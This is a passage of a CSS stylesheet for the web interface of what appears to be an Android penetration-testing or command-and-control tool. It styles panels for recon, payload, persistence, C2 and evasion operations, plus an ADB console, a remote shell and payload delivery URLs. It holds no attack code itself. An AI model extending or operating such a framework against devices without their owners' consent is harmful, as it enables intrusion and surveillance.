.sess-pill.error   .sp-dot{background:var(--red)!important;}
.sess-pill.done    .sp-label{color:var(--muted);}
.sess-pill.done    .sp-op{color:var(--muted);background:transparent;}
.sess-pill.error   .sp-label{color:var(--red);}
.sess-pill.error   .sp-op{color:var(--red);background:rgba(255,80,80,0.08);}
#sess-count{
  font-size:0.65rem;color:var(--muted);flex-shrink:0;margin-left:auto;
  letter-spacing:0.06em;padding-left:8px;border-left:1px solid var(--border);
}

/* PROCESS SNIFFER PANEL */
#proc-sniff-panel{
  display:none; flex-direction:column; gap:6px; margin-top:10px;
  border:1px solid var(--border2); background:var(--bg1); padding:10px;
}
#proc-sniff-panel.visible{display:flex;}
#proc-sniff-panel .ps-toolbar{display:flex;align-items:center;gap:8px;}
#proc-sniff-panel .ps-filter{
  flex:1;background:var(--bg2);border:1px solid var(--border);color:var(--text);
  font-family:var(--mono);font-size:0.7rem;padding:4px 7px;outline:none;
}
#proc-sniff-panel .ps-filter:focus{border-color:var(--green);}
#proc-sniff-panel .ps-btn{
  font-family:var(--mono);font-size:0.64rem;letter-spacing:0.06em;padding:4px 10px;
  border:1px solid var(--border2);background:var(--bg2);color:var(--text);cursor:pointer;
}
#proc-sniff-panel .ps-btn.active{border-color:var(--green);color:var(--green);}
#proc-sniff-panel .ps-btn:hover{border-color:var(--white);color:var(--white);}
#proc-sniff-panel .ps-count{font-size:0.6rem;color:var(--muted);margin-left:auto;}
#proc-table{
  width:100%;border-collapse:collapse;font-family:var(--mono);font-size:0.64rem;
  max-height:220px;overflow-y:auto;display:block;
}
#proc-table thead{position:sticky;top:0;background:var(--bg2);}
#proc-table th{
  text-align:left;padding:3px 8px;color:var(--muted);letter-spacing:0.06em;
  border-bottom:1px solid var(--border2);font-weight:400;white-space:nowrap;
}
#proc-table td{
  padding:2px 8px;color:var(--text);border-bottom:1px solid var(--border);
  white-space:nowrap;cursor:pointer;
}
#proc-table tr:hover td{background:var(--bg2);color:var(--white);}
#proc-table tr.selected td{background:var(--bg3);color:var(--green);}
#proc-table td.ps-pid{color:var(--muted);}
#proc-table td.ps-user{color:var(--blue-dim);}
#proc-table td.ps-name{max-width:200px;overflow:hidden;text-overflow:ellipsis;}
#proc-table td.ps-state-R{color:var(--green);}
#proc-table td.ps-state-S{color:var(--muted);}
#proc-table td.ps-state-Z{color:var(--red);}

/* TOP BAR */
#topbar{
  display:flex;align-items:center;gap:14px;padding:0 18px;height:52px;
  background:rgba(6,6,6,0.88);border-bottom:1px solid rgba(68,221,255,0.18);
  flex-shrink:0;backdrop-filter:blur(6px);
}
#topbar .logo{
  font-family:var(--disp);font-size:1.05rem;font-weight:800;
  color:var(--white);letter-spacing:-0.02em;white-space:nowrap;
  animation:logoShimmer 4s ease-in-out infinite;
}
#topbar .logo-sep{color:var(--accent);font-weight:400;margin:0 4px;opacity:0.6;}
#topbar .logo-sub{
  font-family:var(--mono);font-size:0.6rem;letter-spacing:0.14em;
  text-transform:uppercase;color:var(--accent);opacity:0.55;
}
#topbar .devbadge{
  display:flex;align-items:center;gap:8px;
  border:1px solid var(--border2);padding:4px 12px;
  transition:border-color var(--t);
}
#topbar .devbadge.connected{border-color:rgba(76,175,80,0.45);}
#topbar .devbadge #dev-dot{
  width:5px;height:5px;background:var(--muted);flex-shrink:0;
  transition:background var(--t),box-shadow var(--t);
}
#topbar .devbadge.connected #dev-dot{background:var(--green);box-shadow:0 0 5px var(--green);}
#topbar .devbadge #dev-name{color:var(--white);font-size:0.72rem;font-family:var(--mono);}
#topbar .devbadge #dev-os{color:var(--muted);font-size:0.6rem;}
#topbar .tb-btn{
  background:none;border:1px solid var(--border2);
  color:var(--muted);padding:5px 11px;cursor:pointer;font-family:var(--mono);
  font-size:0.65rem;letter-spacing:0.06em;text-transform:uppercase;white-space:nowrap;
  transition:border-color var(--t),color var(--t),background var(--t),box-shadow var(--t);
  display:inline-flex;align-items:center;gap:5px;line-height:1;
}
#topbar .tb-btn svg{flex-shrink:0;opacity:0.6;transition:opacity var(--t);}
#topbar .tb-btn:hover{border-color:var(--border3);color:var(--white);background:rgba(255,255,255,0.04);}
#topbar .tb-btn:hover svg{opacity:1;}
#topbar #kill-btn{border-color:rgba(229,57,53,0.35);color:var(--red);background:rgba(229,57,53,0.05);}
#topbar #kill-btn:hover{background:var(--red-dim);border-color:var(--red);box-shadow:0 0 10px rgba(229,57,53,0.2);}
#topbar #kill-btn svg{opacity:0.8;}
#topbar #kill-btn.active{animation:pulse .7s infinite;}
#topbar #sidebar-toggle-btn.active{color:var(--accent);border-color:var(--accent);background:var(--accent-dim);}
#topbar #sidebar-toggle-btn.active svg{opacity:1;}
@keyframes pulse{0%{opacity:1}50%{opacity:.35}100%{opacity:1}}
#lhost-display{font-size:0.58rem;letter-spacing:0.1em;color:var(--muted);margin-left:auto;}

/* MAIN */
#main{display:flex;flex:1;overflow:hidden;}

/* SIDEBAR */
#sidebar{
  width:210px;flex-shrink:0;background:rgba(12,12,12,0.95);
  border-right:1px solid rgba(255,255,255,0.08);
  display:flex;flex-direction:column;overflow-y:auto;
  transition:width 0.2s ease,opacity 0.2s ease;
}
#sidebar.hidden{width:0;overflow:hidden;border-right:none;opacity:0;pointer-events:none;}

/* APK FILE BROWSER MODAL */
#apk-browser-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.65);z-index:9000;display:none;align-items:center;justify-content:center;}
#apk-browser-overlay.show{display:flex;}
#apk-browser-modal{background:var(--bg1);border:1px solid var(--border2);width:520px;max-width:95vw;max-height:70vh;display:flex;flex-direction:column;box-shadow:0 8px 48px rgba(0,0,0,0.7);}
#apk-browser-header{display:flex;align-items:center;gap:8px;padding:10px 14px;border-bottom:1px solid var(--border2);flex-shrink:0;}
#apk-browser-title{font-size:0.58rem;letter-spacing:0.18em;text-transform:uppercase;color:var(--muted);font-weight:700;}
#apk-browser-path{flex:1;font-family:var(--mono);font-size:0.62rem;color:var(--silver);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
#apk-browser-close{background:none;border:none;color:var(--muted);font-size:1rem;cursor:pointer;padding:0 4px;line-height:1;}
#apk-browser-close:hover{color:var(--white);}
#apk-browser-toolbar{display:flex;align-items:center;gap:6px;padding:6px 14px;border-bottom:1px solid var(--border2);flex-shrink:0;}
#apk-browser-up{background:none;border:1px solid var(--border2);color:var(--muted);font-family:var(--mono);font-size:0.6rem;padding:3px 10px;cursor:pointer;transition:color var(--t),border-color var(--t);}
#apk-browser-up:hover{color:var(--white);border-color:var(--border3);}
#apk-browser-filter{flex:1;background:var(--bg2);border:1px solid var(--border2);color:var(--white);font-family:var(--mono);font-size:0.65rem;padding:4px 8px;outline:none;}
#apk-browser-filter::placeholder{color:var(--muted);}
#apk-browser-list{flex:1;overflow-y:auto;padding:4px 0;}
.apk-entry{display:flex;align-items:center;gap:10px;padding:6px 14px;cursor:pointer;font-family:var(--mono);font-size:0.68rem;border-bottom:1px solid rgba(68,221,255,0.04);transition:background var(--t);}
.apk-entry:hover{background:rgba(255,255,255,0.04);}
.apk-entry.is-dir{color:var(--silver);}
.apk-entry.is-apk{color:var(--accent);}
.apk-entry.is-apk:hover{background:rgba(68,221,255,0.07);}
.apk-entry.is-other{color:var(--muted);cursor:default;}
.apk-entry .ae-icon{font-size:0.7rem;flex-shrink:0;width:14px;text-align:center;}
.apk-entry .ae-name{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
.apk-entry .ae-size{font-size:0.58rem;color:var(--muted);flex-shrink:0;}
#apk-browser-empty{padding:24px 14px;text-align:center;color:var(--muted);font-size:0.65rem;display:none;}
#apk-browser-loading{padding:20px 14px;text-align:center;color:var(--muted);font-size:0.65rem;letter-spacing:0.1em;}
#dev-selector{padding:10px 12px;border-bottom:1px solid var(--border2);}
#dev-selector select{
  width:100%;background:var(--bg2);border:1px solid var(--border2);color:var(--white);
  padding:6px 8px;font-family:var(--mono);font-size:0.72rem;
}
#dev-selector button{
  width:100%;margin-top:6px;background:none;border:1px solid var(--border2);
  color:var(--muted);padding:5px;font-family:var(--mono);font-size:0.62rem;
  letter-spacing:0.08em;text-transform:uppercase;cursor:pointer;
  transition:color var(--t),border-color var(--t),box-shadow var(--t);
}
#dev-selector button:hover{color:var(--accent);border-color:var(--accent);box-shadow:0 0 8px var(--accent-dim);}
.op-group{border-bottom:1px solid rgba(255,255,255,0.06);}
.op-group-title{
  padding:8px 10px 8px 12px;color:var(--grey2);font-size:0.56rem;text-transform:uppercase;
  letter-spacing:0.16em;cursor:pointer;user-select:none;display:flex;
  justify-content:space-between;align-items:center;
  border-left:3px solid transparent;
  transition:color var(--t),border-color var(--t),background var(--t);
}
.op-group-title:hover{color:var(--silver);background:rgba(255,255,255,0.025);}
.op-group-title .arrow{transition:.2s;font-size:0.48rem;color:var(--grey3);}
.op-group.collapsed .arrow{transform:rotate(-90deg);}
.op-group.collapsed .op-list{display:none;}
.op-item{
  padding:7px 14px 7px 15px;cursor:pointer;color:var(--grey2);font-size:0.7rem;
  border-left:2px solid transparent;transition:color var(--t),background var(--t),border-color var(--t);
}
.op-item:hover{color:var(--silver);background:rgba(255,255,255,0.03);border-left-color:var(--grey3);}
.op-item.active{color:var(--white);font-weight:500;}
/* category accent on group title border and active item */
.op-group[data-cat="recon"]   .op-group-title{border-left-color:var(--cat-recon);}
.op-group[data-cat="access"]  .op-group-title{border-left-color:var(--cat-access);}
.op-group[data-cat="payload"] .op-group-title{border-left-color:var(--cat-payload);}
.op-group[data-cat="instr"]   .op-group-title{border-left-color:var(--cat-instr);}
.op-group[data-cat="persist"] .op-group-title{border-left-color:var(--cat-persist);}
.op-group[data-cat="c2"]      .op-group-title{border-left-color:var(--cat-c2);}
.op-group[data-cat="evasion"] .op-group-title{border-left-color:var(--cat-evasion);}
.op-group[data-cat="auto"]    .op-group-title{border-left-color:var(--cat-auto);}
.op-group[data-cat="recon"]   .op-group-title{color:var(--cat-recon);opacity:0.75;}
.op-group[data-cat="access"]  .op-group-title{color:var(--cat-access);opacity:0.75;}
.op-group[data-cat="payload"] .op-group-title{color:var(--cat-payload);opacity:0.75;}
.op-group[data-cat="instr"]   .op-group-title{color:var(--cat-instr);opacity:0.75;}
.op-group[data-cat="persist"] .op-group-title{color:var(--cat-persist);opacity:0.75;}
.op-group[data-cat="c2"]      .op-group-title{color:var(--cat-c2);opacity:0.75;}
.op-group[data-cat="evasion"] .op-group-title{color:var(--cat-evasion);opacity:0.75;}
.op-group[data-cat="auto"]    .op-group-title{color:var(--cat-auto);opacity:0.75;}
.op-group[data-cat="recon"]   .op-item.active{color:var(--cat-recon);border-left-color:var(--cat-recon);background:rgba(100,181,246,0.06);}
.op-group[data-cat="access"]  .op-item.active{color:var(--cat-access);border-left-color:var(--cat-access);background:rgba(255,112,67,0.06);}
.op-group[data-cat="payload"] .op-item.active{color:var(--cat-payload);border-left-color:var(--cat-payload);background:rgba(68,221,255,0.06);}
.op-group[data-cat="instr"]   .op-item.active{color:var(--cat-instr);border-left-color:var(--cat-instr);background:rgba(206,147,216,0.06);}
.op-group[data-cat="persist"] .op-item.active{color:var(--cat-persist);border-left-color:var(--cat-persist);background:rgba(255,183,77,0.06);}
.op-group[data-cat="c2"]      .op-item.active{color:var(--cat-c2);border-left-color:var(--cat-c2);background:rgba(102,187,106,0.06);}
.op-group[data-cat="evasion"] .op-item.active{color:var(--cat-evasion);border-left-color:var(--cat-evasion);background:rgba(240,98,146,0.06);}
.op-group[data-cat="auto"]    .op-item.active{color:var(--cat-auto);border-left-color:var(--cat-auto);background:rgba(255,167,38,0.06);}

/* RIGHT */
#right{display:flex;flex-direction:column;flex:1;overflow:hidden;}

/* PARAMS PANEL */
#params-panel{
  background:rgba(12,12,12,0.9);border-bottom:1px solid rgba(68,221,255,0.1);
  padding:14px 18px;flex-shrink:0;overflow-y:auto;max-height:240px;
  backdrop-filter:blur(4px);
}
#params-panel .op-title{
  font-family:var(--disp);font-size:1rem;font-weight:700;letter-spacing:-0.02em;
  color:var(--white);margin-bottom:4px;
  text-shadow:0 0 20px rgba(68,221,255,0.2);
}
#params-panel .op-desc{color:var(--muted);font-size:0.68rem;margin-bottom:12px;line-height:1.7;}
#params-form{display:flex;flex-wrap:wrap;gap:10px;align-items:flex-end;}
.field{display:flex;flex-direction:column;gap:4px;min-width:150px;}
.field label{
  color:var(--muted);font-size:0.58rem;text-transform:uppercase;letter-spacing:0.12em;
}
.field input,.field select{
  background:rgba(22,22,22,0.95);border:1px solid var(--border2);color:var(--white);
  padding:6px 8px;font-family:var(--mono);font-size:0.75rem;width:100%;
  transition:border-color var(--t),box-shadow var(--t);
}
.field input:focus,.field select:focus{
  outline:none;border-color:var(--accent);
  box-shadow:0 0 0 1px var(--accent-dim),0 0 8px var(--accent-dim);
}
#run-btn{
  background:var(--white);color:#060606;border:none;padding:7px 22px;
  font-family:var(--disp);font-size:0.78rem;font-weight:700;letter-spacing:0.06em;
  cursor:pointer;height:32px;margin-top:auto;text-transform:uppercase;
  transition:background var(--t),box-shadow var(--t),transform var(--t);
  position:relative;overflow:hidden;
}
#run-btn::after{
  content:'';position:absolute;inset:0;
  background:linear-gradient(90deg,transparent 0%,rgba(255,255,255,0.18) 50%,transparent 100%);
  transform:translateX(-100%);transition:transform 0.4s ease;
}
#run-btn:hover{background:var(--off);box-shadow:0 0 14px rgba(76,175,80,0.4);transform:translateY(-1px);}
#run-btn:hover::after{transform:translateX(100%);}
#run-btn:active{transform:translateY(0);}
#run-btn.running-glow{animation:runGlow 1.2s ease-in-out infinite;}
#run-btn:disabled{background:var(--bg4);cursor:not-allowed;color:var(--muted);box-shadow:none;transform:none;}
.op-cli-hint{display:flex;align-items:center;gap:8px;margin-top:6px;padding:5px 10px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.07);width:100%;}
.op-cli-label{font-size:0.5rem;letter-spacing:0.18em;text-transform:uppercase;color:var(--muted);flex-shrink:0;font-weight:700;padding:1px 5px;border:1px solid var(--border2);}
.op-cli-hint code{font-family:var(--mono);font-size:0.62rem;color:var(--grey);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
.params-placeholder{display:flex;flex-direction:column;gap:6px;padding:4px 0;}
.params-placeholder .pp-title{font-family:var(--disp);font-size:0.9rem;font-weight:700;color:var(--white);letter-spacing:-0.02em;}
.params-placeholder .pp-hint{font-size:0.65rem;color:var(--muted);line-height:1.6;}
.params-placeholder .pp-cats{display:flex;flex-wrap:wrap;gap:5px;margin-top:4px;}
.pp-cat{font-size:0.55rem;letter-spacing:0.1em;padding:2px 8px;border:1px solid;font-family:var(--mono);}

/* TABS */
#tabs{
  display:flex;background:rgba(10,10,10,0.9);border-bottom:1px solid rgba(68,221,255,0.1);
  flex-shrink:0;overflow-x:auto;backdrop-filter:blur(4px);
}
.tab{
  padding:10px 16px;cursor:pointer;color:var(--muted);
  font-size:0.65rem;letter-spacing:0.1em;text-transform:uppercase;
  border-bottom:2px solid transparent;transition:color var(--t),border-color var(--t),text-shadow var(--t);
  white-space:nowrap;
}
.tab:hover{color:var(--grey);}
.tab.active{
  color:var(--accent);border-bottom-color:var(--accent);
  text-shadow:0 0 12px var(--accent-glow);
}
.tab .badge{
  display:inline-block;background:var(--red);color:var(--white);
  font-size:0.5rem;padding:1px 5px;margin-left:5px;letter-spacing:0;
  animation:dotBlink 1.5s ease-in-out infinite;
}

/* TERMINAL */
#terminal-wrap{flex:1;overflow:hidden;display:flex;flex-direction:column;}
#term-toolbar{
  display:flex;align-items:center;gap:6px;padding:4px 10px;
  background:var(--bg1);border-bottom:1px solid var(--border2);flex-shrink:0;
}
#term-toolbar .tt-btn{
  background:none;border:1px solid var(--border2);color:var(--muted);
  font-family:var(--mono);font-size:0.6rem;letter-spacing:0.06em;padding:2px 9px;cursor:pointer;
  transition:color var(--t),border-color var(--t);white-space:nowrap;
}
#term-toolbar .tt-btn:hover{color:var(--white);border-color:var(--border3);}
#term-toolbar .tt-btn.active{color:var(--green);border-color:var(--green);}
#term-find-bar{display:none;align-items:center;gap:5px;flex:1;}
#term-find-bar.open{display:flex;}
#term-find-inp{
  background:var(--bg2);border:1px solid var(--border2);color:var(--white);
  font-family:var(--mono);font-size:0.68rem;padding:2px 8px;outline:none;width:160px;
}
#term-find-inp:focus{border-color:var(--green);}
#term-find-count{font-size:0.58rem;color:var(--muted);white-space:nowrap;}
.tt-sep{width:1px;height:14px;background:var(--border2);flex-shrink:0;}
#term-line-ct{font-size:0.58rem;color:var(--muted);margin-left:auto;white-space:nowrap;}
#terminal{
  flex:1;overflow-y:auto;padding:14px 18px;background:rgba(6,6,6,0.72);
  font-family:var(--mono);font-size:0.78rem;line-height:1.75;white-space:pre-wrap;word-break:break-all;
}
#terminal.nowrap{white-space:nowrap;word-break:normal;overflow-x:auto;}
#terminal .ln{display:block;}
#terminal .ln.find-match{background:rgba(255,204,68,0.15);}
#terminal .ln.find-current{background:rgba(255,204,68,0.35);}
#terminal .find-hl{background:rgba(255,204,68,0.5);color:var(--bg);}
#terminal .ts{color:var(--muted);margin-right:8px;user-select:none;font-size:0.62rem;}

/* ADB CONSOLE */
#adb-console{display:none;flex-direction:column;flex:1;overflow:hidden;}
#adb-output{
  flex:1;overflow-y:auto;padding:14px 18px;background:rgba(6,6,6,0.72);
  font-family:var(--mono);font-size:0.78rem;line-height:1.75;white-space:pre-wrap;
}
#adb-input-row{
  display:flex;gap:8px;padding:10px 14px;background:var(--bg1);
  border-top:1px solid var(--border2);align-items:center;
}
#adb-input-row span{color:var(--green);font-size:0.75rem;}
#adb-input{
  flex:1;background:transparent;border:none;color:var(--white);
  font-family:var(--mono);font-size:0.78rem;outline:none;
}

/* SHELL (PTY) */
#shell-panel{display:none;flex-direction:column;flex:1;overflow:hidden;}
#shell-toolbar{
  display:flex;align-items:center;gap:5px;padding:4px 10px;
  background:var(--bg1);border-bottom:1px solid var(--border2);flex-shrink:0;flex-wrap:wrap;
}
#shell-toolbar .tt-btn{
  background:none;border:1px solid var(--border2);color:var(--muted);
  font-family:var(--mono);font-size:0.6rem;letter-spacing:0.06em;padding:2px 9px;cursor:pointer;
  transition:color var(--t),border-color var(--t);white-space:nowrap;
}
#shell-toolbar .tt-btn:hover{color:var(--white);border-color:var(--border3);}
#shell-toolbar .tt-btn.active{color:var(--green);border-color:var(--green);}
#pty-dot{width:7px;height:7px;border-radius:50%;background:var(--muted);flex-shrink:0;transition:background var(--t);}
#pty-dot.on{background:var(--green);box-shadow:0 0 5px var(--green);}
#pty-status{font-size:0.6rem;color:var(--muted);letter-spacing:0.08em;transition:color var(--t);}
#pty-status.on{color:var(--green);}
#pty-info{margin-left:auto;font-size:0.57rem;color:var(--muted);}
#pty-output{
  flex:1;overflow-y:auto;padding:12px 16px;
  background:rgba(6,6,6,0.82);
  font-family:var(--mono);font-size:0.78rem;line-height:1.75;
  white-space:pre-wrap;word-break:break-all;
}
#pty-input-row{
  display:flex;align-items:center;gap:0;padding:0;
  background:rgba(8,8,8,0.96);border-bottom:1px solid rgba(255,255,255,0.07);flex-shrink:0;
}
#pty-prompt-label{
  display:flex;align-items:center;gap:5px;
  font-family:var(--mono);font-size:0.7rem;font-weight:600;
  white-space:nowrap;padding:8px 0 8px 14px;flex-shrink:0;user-select:none;
}
#pty-prompt-label .ppl-brand{color:var(--accent);letter-spacing:0.04em;}
#pty-prompt-label .ppl-sep{color:var(--grey3);}
#pty-prompt-label .ppl-caret{color:var(--green);}
#pty-input{
  flex:1;background:transparent;border:none;color:var(--white);
  font-family:var(--mono);font-size:0.75rem;outline:none;caret-color:var(--green);
  padding:8px 14px 8px 5px;
}
#pty-input::placeholder{color:var(--grey3);font-size:0.63rem;}

/* FINDINGS */
#findings-panel{display:none;flex-direction:column;flex:1;overflow:hidden;}
#f-toolbar{
  display:flex;align-items:center;gap:8px;padding:6px 14px;
  background:var(--bg1);border-bottom:1px solid var(--border2);flex-shrink:0;flex-wrap:wrap;
}
#f-toolbar .f-tab{
  font-family:var(--mono);font-size:0.62rem;letter-spacing:0.07em;color:var(--muted);
  cursor:pointer;padding:2px 10px;border-bottom:2px solid transparent;
  transition:color var(--t);white-space:nowrap;
}
#f-toolbar .f-tab:hover{color:var(--grey);}
#f-toolbar .f-tab.active{color:var(--white);border-bottom-color:var(--white);}
#f-toolbar .f-actions{margin-left:auto;display:flex;gap:6px;}
#f-toolbar .f-action-btn{
  background:none;border:1px solid var(--border2);color:var(--muted);
  font-family:var(--mono);font-size:0.58rem;letter-spacing:0.06em;padding:2px 9px;cursor:pointer;
}
#f-toolbar .f-action-btn:hover{color:var(--white);border-color:var(--border3);}
#f-body{flex:1;overflow-y:auto;padding:14px 16px;}
#f-empty{padding:24px 16px;color:var(--muted);font-size:0.7rem;text-align:center;}
.f-section{margin-bottom:14px;border:1px solid var(--border2);}
.f-section-hdr{
  display:flex;align-items:center;gap:8px;
  padding:6px 12px;background:var(--bg2);border-bottom:1px solid var(--border2);
  font-family:var(--mono);font-size:0.62rem;letter-spacing:0.1em;text-transform:uppercase;
  color:var(--muted);cursor:pointer;user-select:none;
}
.f-section-hdr:hover{color:var(--grey);}
.f-section-hdr .f-toggle{margin-left:auto;font-size:0.65rem;}
.f-section-body{padding:10px 14px;}
.f-kv-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:4px 14px;}
.f-kv{display:flex;flex-direction:column;padding:4px 0;border-bottom:1px solid var(--border);}
.f-kv .fk{font-size:0.58rem;color:var(--muted);letter-spacing:0.08em;text-transform:uppercase;}
.f-kv .fv{font-size:0.73rem;color:var(--white);font-family:var(--mono);margin-top:1px;}
.f-kv .fv.ok{color:var(--green);}
.f-kv .fv.warn{color:#e67828;}
.f-kv .fv.crit{color:var(--red);}
.f-summary-chips{display:flex;gap:6px;flex-wrap:wrap;padding:8px 14px;}
.sev{font-size:0.52rem;letter-spacing:0.1em;text-transform:uppercase;padding:2px 8px;font-weight:600;}
.sev.CRITICAL{background:var(--red-dim);color:var(--red);border:1px solid rgba(229,57,53,0.3);}
.sev.HIGH{background:rgba(230,120,40,0.1);color:#e67828;border:1px solid rgba(230,120,40,0.3);}
.sev.MEDIUM{background:rgba(200,170,50,0.1);color:#c8aa32;border:1px solid rgba(200,170,50,0.3);}
.sev.LOW{background:var(--blue-dim);color:var(--blue);border:1px solid rgba(61,139,205,0.3);}
.sev.INFO{background:var(--green-dim);color:var(--green);border:1px solid rgba(76,175,80,0.3);}
.f-vuln-row{
  display:flex;align-items:flex-start;gap:10px;padding:7px 0;
  border-bottom:1px solid var(--border);font-size:0.72rem;
}
.f-vuln-row:last-child{border-bottom:none;}
.f-vuln-text{flex:1;color:var(--text);line-height:1.6;}
.f-vuln-text b{color:var(--white);display:block;margin-bottom:2px;}
.f-vuln-text .f-rec{color:var(--muted);font-size:0.66rem;margin-top:3px;}
.f-vuln-row .f-cve{font-size:0.6rem;color:var(--blue);white-space:nowrap;}
.f-filter-row{display:flex;gap:5px;padding:8px 14px;flex-wrap:wrap;}
.f-filt{
  background:none;border:1px solid var(--border2);color:var(--muted);
  font-family:var(--mono);font-size:0.58rem;letter-spacing:0.06em;padding:2px 8px;cursor:pointer;
}
.f-filt:hover{border-color:var(--border3);color:var(--grey);}
.f-filt.on{color:var(--white);border-color:var(--white);}
.f-filt.on.CRITICAL{color:var(--red);border-color:var(--red);}
.f-filt.on.HIGH{color:#e67828;border-color:#e67828;}
.f-filt.on.MEDIUM{color:#c8aa32;border-color:#c8aa32;}
.f-filt.on.LOW{color:var(--blue);border-color:var(--blue);}
.f-app-row{display:flex;align-items:center;gap:8px;padding:6px 0;border-bottom:1px solid var(--border);}
.f-app-row .f-app-pkg{font-family:var(--mono);font-size:0.7rem;color:var(--white);flex:1;}
.f-app-row .f-score{font-size:0.62rem;padding:2px 8px;}
.f-delivery{padding:10px 14px;}
.f-del-url{
  display:flex;align-items:center;gap:8px;background:var(--bg2);
  border:1px solid var(--border2);padding:8px 12px;margin-bottom:8px;
}
.f-del-url .f-url-text{
  flex:1;font-family:var(--mono);font-size:0.72rem;color:var(--blue);
  word-break:break-all;line-height:1.5;
}
.f-del-btn{
  background:none;border:1px solid var(--border2);color:var(--muted);
  font-family:var(--mono);font-size:0.58rem;letter-spacing:0.06em;
  padding:3px 10px;cursor:pointer;white-space:nowrap;flex-shrink:0;
}
.f-del-btn:hover{color:var(--white);border-color:var(--white);}
.f-del-btn.primary{border-color:var(--green);color:var(--green);}
.f-del-qr{
  background:var(--bg2);border:1px solid var(--border2);padding:10px;
  font-family:var(--mono);font-size:0.62rem;line-height:1.0;color:var(--green);
  overflow-x:auto;white-space:pre;margin-bottom:8px;
}
.f-del-cmd{
  display:flex;align-items:center;gap:8px;background:var(--bg2);
  border:1px solid var(--border2);padding:6px 12px;margin-bottom:6px;font-size:0.68rem;
}
.f-del-cmd code{flex:1;font-family:var(--mono);color:var(--text);}
.f-del-cmd .f-del-btn{padding:2px 8px;}
.f-errors{padding:10px 14px;}
.f-err-item{
  background:var(--red-dim);border:1px solid rgba(229,57,53,0.3);
  padding:8px 12px;margin-bottom:6px;font-size:0.72rem;color:var(--red);font-family:var(--mono);
}
.f-raw pre{
  padding:10px 14px;font-family:var(--mono);font-size:0.65rem;color:var(--muted);
  overflow-x:auto;white-space:pre;line-height:1.6;
}

/* DELIVERY TAB (legacy compat) */
#qr-panel{display:none;}
.qr-card{background:var(--bg1);border:1px solid var(--border2);margin-bottom:12px;padding:14px 16px;}
.qr-card pre{color:var(--green);font-size:0.68rem;line-height:1.1;overflow-x:auto;}
.qr-url{color:var(--blue);font-size:0.8rem;word-break:break-all;}

/* ══ UNIFIED PAYLOAD & DELIVERY PANEL ══════════════════════════════════════ */
#pd-panel{display:none;flex-direction:column;flex:1;overflow:hidden;min-height:0;}
.pd-toolbar{
  display:flex;align-items:center;gap:8px;padding:7px 14px;
  background:var(--bg1);border-bottom:1px solid var(--border2);
  flex-shrink:0;flex-wrap:wrap;
}
.pd-toolbar-title{
  font-size:0.6rem;letter-spacing:0.16em;text-transform:uppercase;
  color:var(--silver);font-weight:600;margin-right:6px;
}
.pd-body{flex:1;overflow-y:auto;padding:12px 16px;display:flex;flex-direction:column;gap:0;min-height:0;}
/* ── mod-menu rows ── */
.pm-row{padding:10px 0;border-bottom:1px solid var(--border2);}
.pm-row:last-child{border-bottom:none;padding-bottom:4px;}
.pm-lbl{
  font-size:0.5rem;letter-spacing:0.2em;text-transform:uppercase;
  color:var(--muted);font-weight:700;margin-bottom:8px;
}
/* chip radios / delivery selectors */
.pm-chips{display:flex;flex-wrap:wrap;gap:4px;}
.pm-chip{
  font-family:var(--mono);font-size:0.62rem;letter-spacing:0.04em;
  padding:4px 12px;border:1px solid var(--border2);color:var(--muted);
  cursor:pointer;transition:all var(--t);user-select:none;
}
.pm-chip:hover{color:var(--white);border-color:var(--border3);}
.pm-chip.sel{color:var(--accent);border-color:var(--accent);background:rgba(68,221,255,0.07);}
.pm-chip input[type=radio]{display:none;}
/* inline sub-fields (conditional) */
.pm-sub{display:none;margin-top:9px;}
.pm-sub.show{display:flex;flex-direction:column;gap:7px;}
.pm-inrow{display:flex;gap:8px;flex-wrap:wrap;align-items:flex-end;}
.pm-col{flex:1;min-width:110px;}
/* checkboxes row */
.pm-chk-row{display:flex;gap:14px;flex-wrap:wrap;}
.pm-chk{display:flex;align-items:center;gap:6px;cursor:pointer;font-size:0.68rem;color:var(--text);}
.pm-chk input[type=checkbox]{accent-color:var(--accent);width:13px;height:13px;cursor:pointer;}
.pm-chk:hover{color:var(--white);}
/* big go button */
.pm-action{display:flex;gap:8px;align-items:stretch;padding:12px 0 4px;}
.pm-go{
  flex:1;font-family:var(--mono);font-size:0.7rem;letter-spacing:0.1em;text-transform:uppercase;
  padding:12px 20px;border:1px solid var(--white);background:var(--white);color:var(--bg);
  cursor:pointer;font-weight:700;transition:background var(--t);
}
.pm-go:hover{background:var(--off);}
.pm-go:disabled{opacity:0.35;cursor:not-allowed;}
/* compat aliases used by existing JS */
.pd-fcard{background:var(--bg1);border:1px solid var(--border2);padding:12px 14px;}
.pd-fhdr{
  font-size:0.52rem;letter-spacing:0.18em;text-transform:uppercase;color:var(--muted);
  margin-bottom:8px;display:flex;align-items:center;gap:8px;font-weight:700;
}
.pd-fhdr::after{content:'';flex:1;height:1px;background:var(--border2);}
/* shared utilities */
.pd-sess-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
@media(max-width:700px){.pd-sess-grid{grid-template-columns:1fr;}}
.pd-act-row{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-top:8px;}
.pd-btn{
  font-family:var(--mono);font-size:0.62rem;letter-spacing:0.06em;text-transform:uppercase;
  padding:6px 14px;border:1px solid var(--border2);background:none;color:var(--text);cursor:pointer;
  transition:all var(--t);white-space:nowrap;
}
.pd-btn:hover{color:var(--white);border-color:var(--border3);}
.pd-btn.primary{background:var(--white);color:var(--bg);border-color:var(--white);font-weight:700;}
.pd-btn.primary:hover{background:var(--off);}
.pd-btn.accent{border-color:var(--accent);color:var(--accent);}
.pd-btn.accent:hover{background:var(--accent-dim);}
.pd-btn.go{background:var(--green);color:#000;border-color:var(--green);font-weight:600;}
.pd-btn.go:hover{background:#45a049;}
.pd-btn.danger{border-color:var(--red);color:var(--red);}
.pd-btn.danger:hover{background:var(--red-dim);}
.pd-btn:disabled{opacity:0.35;cursor:not-allowed;}
.pd-log{
  background:rgba(6,6,6,0.9);border:1px solid var(--border2);
  font-family:var(--mono);font-size:0.65rem;line-height:1.7;padding:9px 13px;
  min-height:54px;max-height:160px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;
  margin-top:8px;
}
.pd-url-box{
